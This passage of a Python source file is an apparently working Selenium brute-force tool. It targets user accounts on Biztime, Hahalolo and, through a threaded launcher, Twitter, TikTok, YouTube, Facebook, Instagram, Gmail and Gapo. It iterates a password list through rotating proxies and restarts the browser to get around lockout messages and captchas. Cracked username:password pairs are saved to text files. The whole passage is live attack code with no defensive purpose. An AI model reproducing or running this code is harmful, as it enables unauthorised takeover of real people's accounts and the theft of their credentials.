        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================BIZTIME======================================
# Complete


def check_login_biztime(brows):
    try:
        brows.implicitly_wait(1)
        brows.find_element(
            By.XPATH, "//div[@class='valign tag_auth_animation']")
        return True
    except:
        return False


def biztime():
    count_while = 0
    count_login = 0
    print("{}Biztime Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.biztime, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    op = Options()
    # op.headless = True
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('biztime'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://biztime.com.vn/")
                brows.find_element(By.NAME, "username").send_keys(
                    options.biztime)
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(By.NAME, "password").send_keys(password)
            brows.find_element(
                By.XPATH, "//button[@class='btn btn-main btn-mat disable_btn tag_wel_btn']").click()
            if check_login_biztime(brows):
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Biztime.txt", "a").write(
                    options.biztime+":"+password+"\n")
                brows.quit()
                break
            else:
                if brows.find_element(By.XPATH, "//div[@class='errors']").text == "Tạm khóa 10 phút do bạn đăng nhập sai nhiều lần!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(By.NAME, "password").clear()
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================HAHALOLO======================================
# Complete


def hahalolo():
    count_while = 0
    count_login = 0
    print("\rHahalolo Account: {}".format(options.hahalolo))
    print("%s<<<<<<+++++Start Attacking Hahalolo++++>>>>>%s" % (R, W))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('hahalolo'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://accounts.hahalolo.com/sign-in/")
                try:
                    brows.find_element(By.ID, "accountId").send_keys(
                        options.hahalolo)
                except:
                    brows.quit()
                    count_login = 0
                    continue
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(By.ID, "password").send_keys(password)
            brows.find_element(
                By.XPATH, "//div[@id='app']/div/div/div/div/div[2]/div/div/div/div[2]").click()
            try:
                brows.find_element(By.ID, "captcha-code")
                count_login = 0
                brows.quit()
                continue
            except:
                count_login
            brows.find_element(By.ID, "password").clear()
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_while += 1
        except selenium.common.exceptions.NoSuchElementException:
            print(
                "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
            io.open("Hahalolo.txt", "a").write(
                options.hahalolo+":"+password+"\n")
            brows.quit()
            break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ===============================CONTROL======================================


try:
    if options.list_password != None:
        load_password_list()
    check = False
    if options.getproxylist != None:
        getProxyList()
        # get_proxy_list = threading.Thread(
        #     target=getProxyList, name="getProxyList")
        check = True
        # get_proxy_list.start()
    if options.twitter != None:
        twitter = threading.Thread(target=twitter, name="twitter")
        check = True
        twitter.start()
    if options.tiktok != None:
        tiktok = threading.Thread(target=tiktok, name="tiktok")
        check = True
        tiktok.start()
    if options.youtube != None:
        youtube = threading.Thread(target=youtube, name="youtube")
        check = True
        youtube.start()
    if options.facebook != None:
        facebook = threading.Thread(
            target=facebook, name="facebook")
        check = True
        facebook.start()
    if options.instagram != None:
        instagram = threading.Thread(
            target=instagram, name="Instagram")
        check = True
        instagram.start()
    if options.gmail != None:
        gmail = threading.Thread(target=gmail, name="Gmail")
        check = True
        gmail.start()
    if options.gapo != None:
        gapo = threading.Thread(target=gapo, name="Gapo")
        check = True
        gapo.start()
    if options.biztime != None:
        biztime = threading.Thread(target=biztime, name="Biztime")
        check = True
        biztime.start()
    if options.hahalolo != None:
        hahalolo = threading.Thread(
            target=hahalolo, name="Hahalolo")
        check = True
        hahalolo.start()
    if not check:
        print(use.usage)
        exit()
except:
    sys.exit(0)
